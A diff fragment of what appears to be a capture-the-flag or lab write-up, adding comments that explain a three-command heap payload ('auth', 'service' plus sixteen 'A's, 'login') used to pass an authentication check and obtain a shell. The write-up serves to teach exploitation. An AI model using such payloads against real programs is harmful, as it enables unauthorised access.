@@ -42,13 +42,13 @@ The program will give us a shell if the value is anything except zero.
 So here is the payload:
 
 ```python
-# first command
+# first command, allocate 4 bytes
 print "auth ";
 
-# second command
+# second command, allocate 16 bytes, after the previous allocation plus some padding
 print "service" + "A" * 16;
 
-# third command
+# third command, do the check
 print "login"
 ```
 
